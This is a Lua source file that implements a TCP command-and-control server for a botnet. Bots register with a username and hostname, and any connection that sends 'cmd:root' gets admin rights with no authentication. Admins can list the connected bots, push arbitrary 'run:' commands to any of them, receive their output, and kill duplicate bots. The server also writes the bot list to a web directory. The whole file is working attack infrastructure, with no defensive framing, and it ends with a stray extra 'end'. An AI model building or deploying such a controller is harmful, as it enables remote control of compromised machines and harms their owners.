socket = require "socket"
copas = require "copas"
require "json"

local ServerIp 		= "*"
local ServerTcpPort = 1234

i	= 0
nb	= 0
cl	= 0
s 	= 0
dt	= 0
ad	= 0

Clients = {}
Admins = {}

function log(str)
	print(str)

end

local tcpSocket = assert(socket.bind(ServerIp, ServerTcpPort))

function handler(skt)

	skt = copas.wrap(skt)

	local tcpIp, tcpPort 	= skt.socket:getpeername()
	local root = false

	Clients[tcpIp..":"..tcpPort] = {ip = tcpIp, port = tcpPort, skt = skt}
	print("new client:\t\t"..tcpIp..":"..tcpPort)
	local me = Clients[tcpIp..":"..tcpPort]

	cl = cl +1
	while true do
		nb=nb+1
		local data, status, partial = skt:receive()

		if data then
			--print(tcpIp..":"..tcpPort.. " :\t"..data)
			if (root) then
				if (data:sub(0,4) == "cmd:") then
					data = data:sub(5)
					--print(data)
					if (data == "client") then
						me.skt:send("jso:lst:"..json.encode(Clients).."\n")
						--print("Clients:", cl)
						--for k,v in pairs(Clients) do
						--	print("tcp :", v.ip, v.port, v.login, v.hostname)
						--end
					elseif (data == "admin") then
						me.skt:send("jso:lst:"..json.encode(Admins).."\n")
						print("Admins:", ad)
						for k,v in pairs(Admins) do
							print("tcp : "..v.ip..":"..v.port.."\n")
						end
					elseif (data:sub(0,4) == "run:") then
						print("send", data:sub(5))
						tab = json.decode(data:sub(5))
						if (tab) then
							Clients[tab.ip..":"..tab.port].skt:send(tab.cmd.."\n")
						end
					else
						me.skt:send("cmd inconue\n")
					end
				else
					if (data == "client") then
						--me.skt:send("jso:lst:"..json.encode(Clients).."\n")
						print("Clients:", cl)
						for k,v in pairs(Clients) do
							print("tcp :", v.ip, v.port, v.login, v.hostname)
							me.skt:send("tcp : "..v.ip..":"..v.port.." "..v.login.." "..v.hostname.."\n")
						end
					elseif (data == "admin") then
						print("Admins:", ad)
						me.skt:send("Admins: "..tostring(ad).."\n")
						for k,v in pairs(Admins) do
							me.skt:send("tcp : "..v.ip..":"..v.port.."\n")
							print("tcp : "..v.ip..":"..v.port.."\n")
						end
					elseif (data:sub(0,4) == "run:") then
						print("send", data:sub(5))
						tab = json.decode(data:sub(5))
						if (tab) then
							Clients[tab.ip..":"..tab.port].skt:send(tab.cmd.."\n")
						end
					else
						me.skt:send("cmd inconue\n")
					end
				end
			elseif (data == "cmd:root") then
				Admins[tcpIp..":"..tcpPort] = {ip = tcpIp, port = tcpPort, skt = skt}
				ad = ad + 1
				cl = cl -1
				root = true
				print("root", me.login, me.hostname)
				for k,v in pairs(Admins) do
					v.skt:send(v.ip..":"..v.port.." new admin\n")
				end
				Clients[tcpIp..':'..tcpPort] = nil
			elseif (data:sub(0,6) == "login:") then
				--print(data)
				data = data:sub(7)
				me.login, me.hostname = data:match('(.*):(.*)')
				-- double = 0
				for k,v in pairs(Clients) do
					if v.login == me.login then
						if (v.port ~= me.port) and (v.ip == me.ip) then
							print("receive login cmd kill old bot", me.login, me.hostname)
							v.skt:send("run:kill\n")
						end
					end
				end
				-- if double > 10 then
				-- 	me.skt:send("run:kill\n")
				-- else
					print("receive login cmd", me.login, me.hostname)
				--end
			else
				print("receive",data)
				for k,v in pairs(Admins) do
					v.skt:send("jso:dat:"..json.encode({client = me, data = data}).."\n")
				end
			end
		end
		if status=="closed" then
			if (root) then
				print("Admin deco:",status, me.login, me.hostname, me.ip, me.port)
				ad = ad -1
				Admins[tcpIp..':'..tcpPort] = nil
				break
			else
				cl = cl - 1
				print("Client deco:",status, me.login, me.hostname, me.ip, me.port)
				for k,v in pairs(Admins) do
					--print()
					--v.skt:send("jso:"..json.encode(Clients[tcpIp..':'..tcpPort]).."\n")
				end
				Clients[tcpIp..':'..tcpPort] = nil
				break
			end
		end
	end
end

copas.addserver(tcpSocket, handler)



while 1 do
	copas.step(0)
	socket.sleep(0.2)

	i = i + 1
    if i > 10 then
        file = io.open("/var/www/html/bot.json", "w")
        file:write(json.encode(Clients))
        file:close()
        i = 0
    end
end
end
